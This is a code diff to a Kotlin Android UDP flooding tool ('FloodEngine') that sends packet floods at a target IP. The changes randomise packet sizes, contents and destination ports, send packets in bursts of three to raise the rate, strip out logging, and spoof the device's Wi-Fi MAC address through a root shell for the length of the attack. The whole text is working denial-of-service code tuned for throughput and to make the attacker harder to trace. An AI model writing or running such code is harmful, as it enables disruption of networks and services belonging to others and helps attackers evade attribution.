@@ -6,20 +6,20 @@ import java.net.DatagramPacket
 import java.net.DatagramSocket
 import java.net.InetAddress
 import java.util.concurrent.atomic.AtomicLong
+import kotlin.random.Random
 
 object FloodEngine {
     @Volatile private var isAttacking = false
     private val packetCount = AtomicLong(0)
     private val jobScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private var activeJobs = mutableListOf<Job>()
 
     fun startFlood(targetIp: String, threads: Int) {
         if (isAttacking) return
         isAttacking = true
         packetCount.set(0)
-        activeJobs.clear()
 
-        val payload = ByteArray(1400) { 'T'.code.toByte() }
+        RootShell.randomizeMac("wlan0")
+
         val address = try {
             InetAddress.getByName(targetIp)
         } catch (e: Exception) {
@@ -28,42 +28,45 @@ object FloodEngine {
         }
 
         for (i in 0 until threads) {
-            val job = jobScope.launch {
+            jobScope.launch {
                 var localCount = 0L
                 var socket: DatagramSocket? = null
                 try {
                     socket = DatagramSocket()
-                    socket.sendBufferSize = 8388608 // 8MB буфер
-                    val port = 80 + (i % 100)
-                    
+                    socket.reuseAddress = true
+                    socket.sendBufferSize = 4194304
+                    socket.trafficClass = 0x10
+
+                    val random = Random(System.nanoTime() + i)
+
                     while (isAttacking) {
-                        val packet = DatagramPacket(payload, payload.size, address, port)
-                        socket.send(packet)
-                        localCount++
-                        
-                        // Пакетное обновление счетчика для производительности
-                        if (localCount >= 500) {
+                        val len = random.nextInt(512, 1401)
+                        val payload = ByteArray(len).apply { random.nextBytes(this) }
+                        // залп из 3 пакетов за цикл: x3 к скорости без новых потоков
+                        repeat(3) {
+                            val port = random.nextInt(1024, 65535)
+                            val packet = DatagramPacket(payload, payload.size, address, port)
+                            socket.send(packet)
+                            localCount++
+                        }
+                        if (localCount >= 1000) {
                             packetCount.addAndGet(localCount)
                             localCount = 0L
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e("TWKS", "Flood thread error", e)
                 } finally {
                     packetCount.addAndGet(localCount)
                     socket?.close()
                 }
             }
-            activeJobs.add(job)
         }
-        Log.i("TWKS", "Started $threads flood threads to $targetIp")
     }
 
     fun stopFlood() {
         isAttacking = false
         jobScope.coroutineContext[Job]?.cancelChildren()
-        activeJobs.clear()
-        Log.i("TWKS", "Flood stopped")
+        RootShell.restoreMac("wlan0")
     }
 
     fun getPacketCount(): Long = packetCount.get()
